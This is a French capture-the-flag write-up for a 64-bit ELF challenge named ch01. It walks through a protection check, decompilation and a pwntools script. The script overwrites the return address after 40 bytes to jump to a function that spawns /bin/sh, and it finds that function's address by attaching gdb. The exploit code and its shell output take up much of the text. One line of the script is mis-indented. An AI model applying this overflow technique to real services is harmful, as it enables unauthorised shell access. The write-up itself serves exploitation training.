## to_pwn

```shell
┌─[luc@parrot]─[~/Desktop/LNE/to_pwn/untitled folder]
└──╼ $file ch01
ch01: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=71cdfa5bb5ce450ea6dcd1ad339f3a9459666ca5, for GNU/Linux 3.2.0, not stripped
┌─[luc@parrot]─[~/Desktop/LNE/to_pwn/untitled folder]
└──╼ $./ch01
./ch01: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./ch01)
```

On cherche alors sur internet la libc 2.34 puis le loader asscocié à cette libc puis on patch le binaire avec `pwninit` (voir method dans LNE to_rev)
On a maintenant notre binaire qui fonctionne.
```shell
┌─[✗]─[luc@parrot]─[~/Desktop/LNE/to_pwn/untitled folder]
└──╼ $./ch01_patched 
       .
       |
       |
    ,-'"`-.
  ,'       `.
  |  _____  |      .-( HEY you ! What's your ID ?! )
  | (_o_o_) |    ,'    
  |         | ,-'
  | |HHHHH| |
  | |HHHHH| |
-'`-._____.-'`-

 > ^C
```

On verifie les protections activées:
```shell
┌─[✗]─[luc@parrot]─[~/Desktop/LNE/to_pwn/untitled folder]
└──╼ $checksec ch01
Processing... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1/1 • 100.0%
                             Checksec Results: ELF                              
┏━━━━━━┳━━━━━┳━━━━━┳━━━━━━┳━━━━━━┳━━━━━━┳━━━━━━┳━━━━━┳━━━━━━┳━━━━━┳━━━━━━┳━━━━━┓
┃ File ┃ NX  ┃ PIE ┃ Can… ┃ Rel… ┃ RPA… ┃ RUN… ┃ Sy… ┃ FOR… ┃ Fo… ┃ For… ┃ Fo… ┃
┃      ┃     ┃     ┃      ┃      ┃      ┃      ┃     ┃      ┃     ┃      ┃ Sc… ┃
┡━━━━━━╇━━━━━╇━━━━━╇━━━━━━╇━━━━━━╇━━━━━━╇━━━━━━╇━━━━━╇━━━━━━╇━━━━━╇━━━━━━╇━━━━━┩
│ ch01 │ Yes │ Yes │  No  │ Full │  No  │  No  │ Yes │  No  │ No  │  No  │  0  │
└──────┴─────┴─────┴──────┴──────┴──────┴──────┴─────┴──────┴─────┴──────┴─────┘
┌─[luc@parrot]─[~/Desktop/LNE/to_pwn/untitled folder]
└──╼ $gdb ch01
......
Reading symbols from ch01...
(No debugging symbols found in ch01)
gef➤  checksec
[+] checksec for '/home/luc/Desktop/LNE/to_pwn/untitled folder/ch01'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full

```
Donc on a :
- Stack non exécutable  ( on ne peut donc pas mettre unshellcode sur la stack puis retouner sur la stack pour l'exécuter )
- PIE  ( mapping random ==> on ne peut pas savoir à l'avance ou sera mappé l'addresse de base du binaire et donc on peut pas savoir à l'avance ou sont les fonctions main etc ... )
- Full RelRo ( On ne peut pas overwrite des entrées dans la GOT car readOnly)

On charge ensuuite le binaire dans ghidra:
*Main*
```c
undefined8 main(void)

{
  check_id();
  return 0;
}
```
*check_id*
```c
void check_id(void)

{
  undefined local_28 [32];
  
  bender("HEY you ! What\'s your ID ?!");
  printf("\n > ");
  __isoc99_scanf(&DAT_0010210f,local_28);
  printf("\n...ID: \"%s\" NOT RECOGNIZED !\n...END OF TRANSMISSION\n",local_28);
  return;
}
```
*bender*
```c

void bender(undefined8 param_1)

{
  printf("       .\n       |\n       |\n    ,-\'\"`-.\n  ,\'       `.\n  |  _____  |      .-( %s )\n   | (_o_o_) |    ,\'    \n  |         | ,-\'\n  | |HHHHH| |\n  | |HHHHH| |\n-\'`-._____.-\'`-\n"
         ,param_1);
  return;
}

```
*suss*
```
void suss(void)

{
  puts("\n...ID: \"ROOT\" RECOGNIZED !");
  bender("You now have full access");
  system("/bin/sh\n");
  return;
}

```

En passant à l'analyse dynamique, on s'aperçoit que scanf rajoute à chaque fois un null bytes à la fin de notre chaine, y'a pas de moyen obvious d'obtenir un leak, ça s'annonce mal.
Le binaire étant 64 bits, un bruteforce de l'ASLR n'est pas envisageable. 

Après avoir longtemps cherché, je ne trouve pas un moyen obvious d'avoir une code exec.

Après avoir longtemps réfléchis, j'ai trouvé comment récup l'addresse de la fonctions suss afin de rediréger le flux d'exec vers cette fonction, mais cela nécessite que gdb soit installé sur la machine cible, Mon exploit repose donc sur l'existence de gdb sur la machine cible.
Le voici.

```python
#!/usr/bin/env python3
from pwn import *
import subprocess

exe = ELF("./ch01_patched")
libc = ELF("./libc.so(7).6")
context.binary = exe

suss_addr = ''

def conn():
	global suss_addr
	if args.LOCAL:
		r = process([exe.path], level="error")
			if args.GDB:
				output = subprocess.getoutput('gdb -batch -ex "attach $(pgrep -n ch01)" -ex "x/x suss" -ex "quit" | grep -m 1 "suss"')
				suss_addr = output.split('<suss')[0].split("\n")[1].strip()
		else:
			r = remote("addr", 1337)
	return r

  

def execute():
	global suss_addr
	r = conn()
	payload = b'\x41'* 40 + p64(int(suss_addr, 16))
	r.sendline(payload)
	return r

def main():
	r = execute()
	r.interactive()

if __name__ == "__main__":
	main()
```

et quand on exécute: 

```
┌─[luc@parrot]─[~/Desktop/LNE/to_pwn/untitled folder]
└──╼ $python3 solve.py LOCAL GDB
[*] '/home/luc/Desktop/LNE/to_pwn/untitled folder/ch01_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[*] '/home/luc/Desktop/LNE/to_pwn/untitled folder/libc.so(7).6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
       .
       |
       |
    ,-'"`-.
  ,'       `.
  |  _____  |      .-( HEY you ! What's your ID ?! )
  | (_o_o_) |    ,'    
  |         | ,-'
  | |HHHHH| |
  | |HHHHH| |
-'`-._____.-'`-

 > 
...ID: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd71|8\xdbU" NOT RECOGNIZED !
...END OF TRANSMISSION

...ID: "ROOT" RECOGNIZED !
       .
       |
       |
    ,-'"`-.
  ,'       `.
  |  _____  |      .-( You now have full access )
  | (_o_o_) |    ,'    
  |         | ,-'
  | |HHHHH| |
  | |HHHHH| |
-'`-._____.-'`-
$  
```